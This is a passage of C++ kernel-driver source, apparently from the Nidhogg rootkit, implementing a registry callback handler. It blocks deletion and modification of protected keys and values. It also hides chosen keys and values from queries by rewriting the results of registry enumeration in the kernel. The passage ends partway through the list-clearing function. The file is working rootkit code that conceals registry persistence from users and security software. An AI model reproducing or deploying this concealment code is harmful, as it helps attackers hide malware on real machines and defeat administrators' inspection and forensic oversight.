#include "pch.h"
#include "RegistryHandler.h"

_IRQL_requires_max_(APC_LEVEL)
RegistryHandler::RegistryHandler() {
	this->regCookie = { 0 };

	if (!InitializeList(&this->keysList.Protected))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&this->keysList.Hidden)) {
		FreeVirtualMemory(this->keysList.Protected.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}

	if (!InitializeList(&this->valuesList.Protected)) {
		FreeVirtualMemory(this->keysList.Hidden.Items);
		FreeVirtualMemory(this->keysList.Protected.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}

	if (!InitializeList(&this->valuesList.Hidden)) {
		FreeVirtualMemory(this->keysList.Hidden.Items);
		FreeVirtualMemory(this->keysList.Protected.Items);
		FreeVirtualMemory(this->valuesList.Protected.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

_IRQL_requires_same_
_IRQL_requires_(PASSIVE_LEVEL)
RegistryHandler::~RegistryHandler() {
	ClearRegistryList(RegItemType::All);
	FreeVirtualMemory(this->keysList.Hidden.Items);
	FreeVirtualMemory(this->keysList.Protected.Items);
	FreeVirtualMemory(this->valuesList.Protected.Items);
	FreeVirtualMemory(this->valuesList.Hidden.Items);
}

/*
* Description:
* OnRegistryNotify is responsible for handling registry operations and handle some of them.
*
* Parameters:
* @context [_In_ PVOID]     -- Unused.
* @arg1    [_In_opt_ PVOID] -- Type of operation.
* @arg2    [_In_opt_ PVOID] -- Operation's information.
*
* Returns:
* @status  [NTSTATUS]		-- Whether the operation was successful or not.
*/
_IRQL_requires_same_
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS OnRegistryNotify(_In_ PVOID context, _In_opt_ PVOID arg1, _In_opt_ PVOID arg2) {
	UNREFERENCED_PARAMETER(context);
	NTSTATUS status = STATUS_SUCCESS;

	if (!arg2)
		return status;

	switch (static_cast<REG_NOTIFY_CLASS>(reinterpret_cast<ULONG_PTR>(arg1))) {
	case RegNtPreDeleteKey:
		status = NidhoggRegistryHandler->RegNtPreDeleteKeyHandler(static_cast<REG_DELETE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreDeleteValueKey:
		status = NidhoggRegistryHandler->RegNtPreDeleteValueKeyHandler(static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryKey:
		status = NidhoggRegistryHandler->RegNtPreQueryKeyHandler(static_cast<REG_QUERY_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryValueKey:
		status = NidhoggRegistryHandler->RegNtPreQueryValueKeyHandler(static_cast<REG_QUERY_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreQueryMultipleValueKey:
		status = NidhoggRegistryHandler->RegNtPreQueryMultipleValueKeyHandler(static_cast<REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPreSetValueKey:
		status = NidhoggRegistryHandler->RegNtPreSetValueKeyHandler(static_cast<REG_SET_VALUE_KEY_INFORMATION*>(arg2));
		break;
	case RegNtPostEnumerateKey:
		status = NidhoggRegistryHandler->RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
		break;
	case RegNtPostEnumerateValueKey:
		status = NidhoggRegistryHandler->RegNtPostEnumerateValueKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
		break;
	}

	return status;
}

/*
* Description:
* RegNtPreDeleteKeyHandler is responsible for handling registry key deletion and block it for protected registry keys.
*
* Parameters:
* @info   [_Inout_ REG_DELETE_KEY_INFORMATION*] -- Contains important information such as key path, key object, etc.
*
* Returns:
* @status [NTSTATUS]						    -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreDeleteKeyHandler(_Inout_ REG_DELETE_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath))
			break;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0)
			break;
		regItem.Type = RegItemType::ProtectedKey;

		if (FindRegItem(regItem))
			status = STATUS_NOT_FOUND;
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreDeleteValueKeyHandler is responsible for handling registry value deletion and block it for protected registry values.
*
* Parameters:
* @info   [_Inout_ REG_DELETE_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]						  -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreDeleteValueKeyHandler(_Inout_ REG_DELETE_VALUE_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath) || !IsValidValue(info->ValueName))
			break;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0)
			break;
		size_t valueLength = min(info->ValueName->Length / sizeof(WCHAR), REG_VALUE_LEN - 1);

		if (wcsncpy_s(regItem.ValueName, REG_VALUE_LEN, info->ValueName->Buffer, valueLength) != 0)
			break;
		regItem.Type = RegItemType::ProtectedValue;

		if (FindRegItem(regItem))
			status = STATUS_NOT_FOUND;
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryKeyHandler is responsible for handling registry key query and block it for hidden registry keys.
*
* Parameters:
* @info   [_Inout_ REG_QUERY_KEY_INFORMATION*] -- Contains important information such as key path, key object, etc.
*
* Returns:
* @status [NTSTATUS]						   -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreQueryKeyHandler(_Inout_ REG_QUERY_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath))
			break;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0)
			break;

		regItem.Type = RegItemType::HiddenKey;

		if (FindRegItem(regItem))
			status = STATUS_NOT_FOUND;
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryValueKeyHandler is responsible for handling registry value query and block it for hidden registry values.
*
* Parameters:
* @info   [_Inout_ REG_QUERY_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]								 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreQueryValueKeyHandler(_Inout_ REG_QUERY_VALUE_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath) || !IsValidValue(info->ValueName))
			break;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0)
			break;
		size_t valueLength = min(info->ValueName->Length / sizeof(WCHAR), REG_VALUE_LEN - 1);

		if (wcsncpy_s(regItem.ValueName, REG_VALUE_LEN, info->ValueName->Buffer, valueLength) != 0)
			break;
		regItem.Type = RegItemType::HiddenValue;

		if (FindRegItem(regItem))
			status = STATUS_NOT_FOUND;
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreQueryMultipleValueKeyHandler is responsible for handling registry multiple value query and block it for hidden registry values.
*
* Parameters:
* @info   [_Inout_ REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, values list, key object, etc.
*
* Returns:
* @status [NTSTATUS]										  -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreQueryMultipleValueKeyHandler(_Inout_ REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath))
			break;
		regItem.Type = RegItemType::HiddenValue;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0) {
			CmCallbackReleaseKeyObjectIDEx(regPath);
			return STATUS_SUCCESS;
		}

		if (!info->ValueEntries || info->EntryCount == 0) {
			CmCallbackReleaseKeyObjectIDEx(regPath);
			return STATUS_SUCCESS;
		}

		for (ULONG index = 0; index < info->EntryCount; index++) {
			if (!IsValidValue(info->ValueEntries[index].ValueName))
				continue;
			size_t valueLength = min(info->ValueEntries[index].ValueName->Length / sizeof(WCHAR), REG_VALUE_LEN - 1);

			if (wcsncpy_s(regItem.ValueName, REG_VALUE_LEN, info->ValueEntries[index].ValueName->Buffer, valueLength) != 0)
				continue;

			if (FindRegItem(regItem)) {
				status = STATUS_NOT_FOUND;
				break;
			}
			regItem.ValueName[0] = L'\0';
		}
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPreSetValueKeyHandler is responsible for handling registry value modify operation and block it for protected registry values.
*
* Parameters:
* @info   [_Inout_ REG_SET_VALUE_KEY_INFORMATION*] -- Contains important information such as key path, value name, key object, etc.
*
* Returns:
* @status [NTSTATUS]							   -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPreSetValueKeyHandler(_Inout_ REG_SET_VALUE_KEY_INFORMATION* info) {
	IoctlRegItem regItem{};
	PCUNICODE_STRING regPath = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	if (!info || !GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	do {
		if (!IsValidKey(regPath) || !IsValidValue(info->ValueName))
			break;
		size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

		if (wcsncpy_s(regItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0)
			break;
		size_t valueLength = min(info->ValueName->Length / sizeof(WCHAR), REG_VALUE_LEN - 1);

		if (wcsncpy_s(regItem.ValueName, REG_VALUE_LEN, info->ValueName->Buffer, valueLength) != 0)
			break;
		regItem.Type = RegItemType::ProtectedValue;

		if (FindRegItem(regItem))
			status = STATUS_NOT_FOUND;
	} while (false);

	CmCallbackReleaseKeyObjectIDEx(regPath);
	return status;
}

/*
* Description:
* RegNtPostEnumerateKeyHandler is responsible for handling registry key enumeration and hide the protected registry keys.
*
* Parameters:
* @info   [_Inout_ REG_POST_OPERATION_INFORMATION*] -- Contains important information such as keys list, keys objects, etc.
*
* Returns:
* @status [NTSTATUS]								-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPostEnumerateKeyHandler(_Inout_ REG_POST_OPERATION_INFORMATION* info) {
	PCUNICODE_STRING regPath = nullptr;
	HANDLE key = NULL;
	ULONG resultLength = 0;
	IoctlRegItem item{};
	IoctlRegItem regPathItem{};
	UNICODE_STRING keyName;
	ULONG counter = 0;

	if (!info)
		return STATUS_SUCCESS;

	if (!NT_SUCCESS(info->Status))
		return info->Status;

	if (!GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	if (!IsValidKey(regPath)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	regPathItem.Type = RegItemType::HiddenKey;
	size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

	if (wcsncpy_s(regPathItem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}

	if (!FindRegItem(regPathItem, true)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	RtlInitUnicodeString(&keyName, L"");
	REG_ENUMERATE_KEY_INFORMATION* preInfo = static_cast<REG_ENUMERATE_KEY_INFORMATION*>(info->PreInformation);

	if (!preInfo || !GetNameFromKeyEnumPreInfo(preInfo->KeyInformationClass, preInfo->KeyInformation, &keyName)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	keyName.Buffer[keyName.MaximumLength / sizeof(WCHAR)] = L'\0';

	// Rebuilding the KeyInformation without the hidden keys.
	NTSTATUS status = ObOpenObjectByPointerWithTag(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, 
		KernelMode, DRIVER_TAG, &key);

	if (!NT_SUCCESS(status)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	MemoryAllocator<PVOID> tempKeyInfo(preInfo->Length);

	if (tempKeyInfo.IsValid()) {
		item.Type = RegItemType::HiddenKey;

		// Use safer string copy with proper length validation
		if (wcsncpy_s(item.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0) {
			info->ReturnStatus = status;
			ZwClose(key);
			CmCallbackReleaseKeyObjectIDEx(regPath);
			return STATUS_SUCCESS;
		}

		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
		status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInfo.Get(),
			preInfo->Length, &resultLength);

		while (status != STATUS_NO_MORE_ENTRIES) {
			if (!GetNameFromKeyEnumPreInfo(preInfo->KeyInformationClass, tempKeyInfo.Get(), &keyName)) {
				counter++;
				status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInfo.Get(),
					preInfo->Length, &resultLength);
				continue;
			}
			keyName.Buffer[keyName.MaximumLength / sizeof(WCHAR)] = L'\0';

			// Concatenating the key path and name to check against FindRegItem.
			if (wcscat_s(item.KeyPath, L"\\") != 0) {
				counter++;
				status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInfo.Get(),
					preInfo->Length, &resultLength);
				continue;
			}
			if (wcscat_s(item.KeyPath, keyName.Buffer) != 0) {
				counter++;
				status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInfo.Get(),
					preInfo->Length, &resultLength);
				continue;
			}

			if (!FindRegItem(item)) {
				*preInfo->ResultLength = resultLength;

				__try {
					RtlCopyMemory(preInfo->KeyInformation, tempKeyInfo.Get(), resultLength);
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					Print(DRIVER_PREFIX "Failed to copy the next key item, 0x%x\n", GetExceptionCode());
				}
			}
			counter++;

			// To avoid concatenating bad item.
			item.KeyPath[0] = L'\0';

			wcsncpy_s(item.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength);
			status = ZwEnumerateKey(key, preInfo->Index + counter, preInfo->KeyInformationClass, tempKeyInfo.Get(), preInfo->Length, &resultLength);
		}
	}

	info->ReturnStatus = status;
	ZwClose(key);
	CmCallbackReleaseKeyObjectIDEx(regPath);

	return STATUS_SUCCESS;
}

/*
* Description:
* RegNtPostEnumerateValueKeyHandler is responsible for handling registry value enumeration and hide the protected registry values.
*
* Parameters:
* @info   [_Inout_ REG_POST_OPERATION_INFORMATION*] -- Contains important information such as keys list, keys objects, etc.
*
* Returns:
* @status [NTSTATUS]								-- Whether the operation was successful or not.
*/
_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS RegistryHandler::RegNtPostEnumerateValueKeyHandler(_Inout_ REG_POST_OPERATION_INFORMATION* info) {
	HANDLE key = NULL;
	REG_ENUMERATE_VALUE_KEY_INFORMATION* preInfo = nullptr;
	PCUNICODE_STRING regPath = nullptr;
	UNICODE_STRING valueName;
	ULONG resultLength = 0;
	IoctlRegItem item{};
	IoctlRegItem regPathitem{};
	NTSTATUS status = STATUS_SUCCESS;
	ULONG counter = 0;

	if (!info)
		return STATUS_SUCCESS;

	if (!NT_SUCCESS(info->Status))
		return info->Status;

	if (!GetKeyObject(info->Object, &regPath))
		return STATUS_SUCCESS;

	if (!IsValidKey(regPath)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	regPathitem.Type = RegItemType::HiddenValue;
	size_t copyLength = min(regPath->Length / sizeof(WCHAR), REG_KEY_LEN - 1);

	if (wcsncpy_s(regPathitem.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength) != 0) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}

	if (!FindRegItem(regPathitem, true)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	preInfo = static_cast<REG_ENUMERATE_VALUE_KEY_INFORMATION*>(info->PreInformation);

	if (!preInfo || !GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, 
		&valueName)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}

	if (!IsValidValue(&valueName)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';

	// Rebuilding the KeyInformation without the hidden keys.
	status = ObOpenObjectByPointerWithTag(info->Object, OBJ_KERNEL_HANDLE, NULL, KEY_ALL_ACCESS, *CmKeyObjectType, KernelMode, DRIVER_TAG, &key);

	if (!NT_SUCCESS(status)) {
		CmCallbackReleaseKeyObjectIDEx(regPath);
		return STATUS_SUCCESS;
	}
	MemoryAllocator<PVOID> tempValueInfo(preInfo->Length);

	if (tempValueInfo.IsValid()) {
		item.Type = RegItemType::HiddenValue;
		wcsncpy_s(item.KeyPath, REG_KEY_LEN, regPath->Buffer, copyLength);
		status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInfo.Get(),
			preInfo->Length, &resultLength);

		// To address the situtation of finding several protected keys, need to do a while until found an unprotected key.
		while (status != STATUS_NO_MORE_ENTRIES) {
			if (!GetNameFromValueEnumPreInfo(preInfo->KeyValueInformationClass, preInfo->KeyValueInformation, &valueName)) {
				counter++;
				status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInfo.Get(),
					preInfo->Length, &resultLength);
				continue;
			}
			valueName.Buffer[valueName.Length / sizeof(WCHAR)] = L'\0';
			item.ValueName[0] = L'\0';
			
			// Safely copy value name with length validation
			size_t valueLength = min(valueName.Length / sizeof(WCHAR), REG_VALUE_LEN - 1);
			wcsncpy_s(item.ValueName, REG_VALUE_LEN, valueName.Buffer, valueLength);

			if (!FindRegItem(item)) {
				*preInfo->ResultLength = resultLength;

				// Adding the try & except to be sure, copying memory shouldn't cause a problem.
				__try {
					RtlCopyMemory(preInfo->KeyValueInformation, tempValueInfo.Get(), resultLength);
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					Print(DRIVER_PREFIX "Failed to copy the next value item, 0x%x\n", GetExceptionCode());
				}
			}
			counter++;
			status = ZwEnumerateValueKey(key, preInfo->Index + counter, preInfo->KeyValueInformationClass, tempValueInfo.Get(),
				preInfo->Length, &resultLength);
		}
	}

	info->ReturnStatus = status;
	ZwClose(key);
	CmCallbackReleaseKeyObjectIDEx(regPath);

	return STATUS_SUCCESS;
}

/*
* Description:
* GetNameFromValueEnumPreInfo is responsible for getting the value name from the key value information.
*
* Parameters:
* @infoClass   [_In_ KEY_VALUE_INFORMATION_CLASS] -- Contains the type of key value infromation.
* @information [_In_ PVOID]					      -- Contains the information itself.
* @valueName   [_Inout_ PUNICODE_STRING]		  -- The value name will be written there.
*
* Returns:
* @bool											  -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::GetNameFromValueEnumPreInfo(_In_ KEY_VALUE_INFORMATION_CLASS infoClass, _In_ PVOID information, _Inout_ PUNICODE_STRING valueName) {
	switch (infoClass) {
	case KeyValueBasicInformation:
	{
		KEY_VALUE_BASIC_INFORMATION* valueInfo = static_cast<KEY_VALUE_BASIC_INFORMATION*>(information);
		valueName->Buffer = valueInfo->Name;
		valueName->Length = static_cast<USHORT>(valueInfo->NameLength);
		valueName->MaximumLength = static_cast<USHORT>(valueInfo->NameLength);
		break;
	}
	case KeyValueFullInformation:
	case KeyValueFullInformationAlign64:
	{
		KEY_VALUE_FULL_INFORMATION* valueInfo = static_cast<KEY_VALUE_FULL_INFORMATION*>(information);
		valueName->Buffer = valueInfo->Name;
		valueName->Length = static_cast<USHORT>(valueInfo->NameLength);
		valueName->MaximumLength = static_cast<USHORT>(valueInfo->NameLength);
		break;
	}
	default:
		return false;
	}
	return true;
}

/*
* Description:
* GetNameFromKeyEnumPreInfo is responsible for getting the key name from the key information.
*
* Parameters:
* @infoClass   [_In_ KEY_VALUE_INFORMATION_CLASS] -- Contains the type of the key infromation.
* @information [_In_ PVOID]					      -- Contains the information itself.
* @keyName     [_Inout_ PUNICODE_STRING]		  -- The key name will be written there.
*
* Returns:
* @bool											  -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::GetNameFromKeyEnumPreInfo(_In_ KEY_INFORMATION_CLASS infoClass, _In_ PVOID information, _Inout_ PUNICODE_STRING keyName) {
	switch (infoClass) {
	case KeyBasicInformation:
	{
		KEY_BASIC_INFORMATION* basicInfo = static_cast<KEY_BASIC_INFORMATION*>(information);
		keyName->Buffer = basicInfo->Name;
		keyName->Length = static_cast<USHORT>(basicInfo->NameLength);
		keyName->MaximumLength = static_cast<USHORT>(basicInfo->NameLength);
		break;
	}
	case KeyNameInformation:
	{
		KEY_NAME_INFORMATION* nameInfo = static_cast<KEY_NAME_INFORMATION*>(information);
		keyName->Buffer = nameInfo->Name;
		keyName->Length = static_cast<USHORT>(nameInfo->NameLength);
		keyName->MaximumLength = static_cast<USHORT>(nameInfo->NameLength);
		break;
	}
	case KeyNodeInformation:
	{
		KEY_NODE_INFORMATION* nodeInfo = static_cast<KEY_NODE_INFORMATION*>(information);
		keyName->Buffer = nodeInfo->Name;
		keyName->Length = static_cast<USHORT>(nodeInfo->NameLength);
		keyName->MaximumLength = static_cast<USHORT>(nodeInfo->NameLength);
		break;
	}
	default:
		return false;
	}

	return true;
}

/*
* Description:
* FindRegItem is responsible for searching if a registry item exists in any of the registry items lists.
*
* Parameters:
* @item	  [RegItem*] -- Registry item to search.
*
* Returns:
* @status [bool]	 -- Whether found or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::FindRegItem(_In_ const IoctlRegItem& item, _In_ bool partial) const {
	RegistryEntryList entriesList = { 0 };

	if (!IsValidKey(item.KeyPath))
		return false;

	switch (item.Type) {
	case RegItemType::ProtectedKey:
	{
		entriesList = this->keysList.Protected;
		break;
	}
	case RegItemType::HiddenKey:
	{
		entriesList = this->keysList.Hidden;
		break;
	}
	case RegItemType::ProtectedValue:
	{
		entriesList = this->valuesList.Protected;
		break;
	}
	case RegItemType::HiddenValue:
	{
		entriesList = this->valuesList.Hidden;
		break;
	}
	default:
		return false;
	}

	if (partial) {
		auto partialFinder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) -> bool {
			if (entry->Type != currentItem.Type)
				return false;
			if (wcslen(entry->KeyPath) > wcslen(currentItem.KeyPath))
				return false;
			return _wcsnicmp(entry->KeyPath, currentItem.KeyPath, wcslen(currentItem.KeyPath)) == 0;
		};
		return FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(entriesList, item, partialFinder);
	}

	auto finder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) -> bool {
		if (entry->Type != currentItem.Type)
			return false;
		bool isSameKey = _wcsicmp(entry->KeyPath, currentItem.KeyPath) == 0;

		if (entry->Type == RegItemType::ProtectedKey || entry->Type == RegItemType::HiddenKey)
			return isSameKey;
		return isSameKey && _wcsicmp(entry->ValueName, currentItem.ValueName) == 0;
	};

	return FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(entriesList, item, finder);
}

/*
* Description:
* AddRegItem is responsible for adding a registry item to the list of protected registry items.
*
* Parameters:
* @item	  [const IoctlRegItem&] -- Registry item to add.
*
* Returns:
* @status [bool]				-- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::AddRegItem(_In_ const IoctlRegItem& item) {
	RegistryEntryList* list = nullptr;

	switch (item.Type) {
	case RegItemType::ProtectedKey:
		list = &this->keysList.Protected;
		break;
	case RegItemType::HiddenKey:
		list = &this->keysList.Hidden;
		break;
	case RegItemType::ProtectedValue:
		list = &this->valuesList.Protected;
		break;
	case RegItemType::HiddenValue:
		list = &this->valuesList.Hidden;
		break;
	default:
		return false;
	}

	if (!IsValidKey(item.KeyPath) ||
		((item.Type == RegItemType::ProtectedValue || item.Type == RegItemType::HiddenValue) &&
			!IsValidValue(item.ValueName)))
		return false;

	if (FindRegItem(item))
		return false;
	RegItem* newEntry = AllocateMemory<RegItem*>(sizeof(RegItem));

	if (!newEntry)
		return false;
	newEntry->Type = item.Type;

	if (wcscpy_s(newEntry->KeyPath, item.KeyPath) != 0) {
		FreeVirtualMemory(newEntry);
		return false;
	}
	if (item.Type == RegItemType::ProtectedValue || item.Type == RegItemType::HiddenValue) {
		if (wcscpy_s(newEntry->ValueName, item.ValueName) != 0) {
			FreeVirtualMemory(newEntry);
			return false;
		}
	}
	AddEntry<RegistryEntryList, RegItem>(list, newEntry);
	return true;
}

/*
* Description:
* RemoveRegItem is responsible for remove a registry item from the list of protected registry items.
*
* Parameters:
* @item	  [IoctlRegItem*] -- Registry item to remove.
*
* Returns:
* @status [bool]		  -- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool RegistryHandler::RemoveRegItem(_In_ const IoctlRegItem& item) {
	if (!IsValidKey(item.KeyPath))
		return false;

	switch (item.Type) {
	case RegItemType::ProtectedKey: {
		auto finder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) {
			return _wcsicmp(entry->KeyPath, currentItem.KeyPath) == 0;
			};
		RegItem* entry = FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(keysList.Protected, item, finder);
		
		if (!entry)
			return false;
		return RemoveListEntry<RegistryEntryList, RegItem>(&keysList.Protected, entry);
	}

	case RegItemType::HiddenKey: {
		auto finder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) {
			return _wcsicmp(entry->KeyPath, currentItem.KeyPath) == 0;
		};
		RegItem* entry = FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(keysList.Hidden, item, finder);

		if (!entry)
			return false;
		return RemoveListEntry<RegistryEntryList, RegItem>(&keysList.Hidden, entry);
	}
	case RegItemType::ProtectedValue: {
		if (!IsValidValue(item.ValueName))
			return false;
		auto finder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) {
			return _wcsicmp(entry->KeyPath, currentItem.KeyPath) == 0 &&
				_wcsicmp(entry->ValueName, currentItem.ValueName) == 0;
			};
		RegItem* entry = FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(valuesList.Protected, item, finder);

		if (!entry)
			return false;
		return RemoveListEntry<RegistryEntryList, RegItem>(&valuesList.Protected, entry);
	}
	case RegItemType::HiddenValue: {
		if (!IsValidValue(item.ValueName))
			return false;
		auto finder = [](_In_ const RegItem* entry, _In_ const IoctlRegItem& currentItem) {
			return _wcsicmp(entry->KeyPath, currentItem.KeyPath) == 0 &&
				_wcsicmp(entry->ValueName, currentItem.ValueName) == 0;
			};
		RegItem* entry = FindListEntry<RegistryEntryList, RegItem, const IoctlRegItem&>(valuesList.Hidden, item, finder);

		if (!entry)
			return false;
		return RemoveListEntry<RegistryEntryList, RegItem>(&valuesList.Hidden, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ClearRegItem is responsible for clearing an array of registry items.
*
* Parameters:
* @regType [RegItemType] -- Type of the registry item to clear.
*
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void RegistryHandler::ClearRegistryList(_In_ RegItemType registryItemType) {
	switch (registryItemType) {
	case RegItemType::ProtectedKey:
		ClearList<RegistryEntryList, RegItem>(&this->keysList.Protected);
		break;
	case RegItemType::HiddenKey:
		ClearList<RegistryEntryList, RegItem>(&this->keysList.Hidden);
		break;
	case RegItemType::ProtectedValue:
		ClearList<RegistryEntryList, RegItem>(&this->valuesList.Protected);
		break;
	case RegItemType::HiddenValue:
		ClearList<RegistryEntryList, RegItem>(&this->valuesList.Hidden);
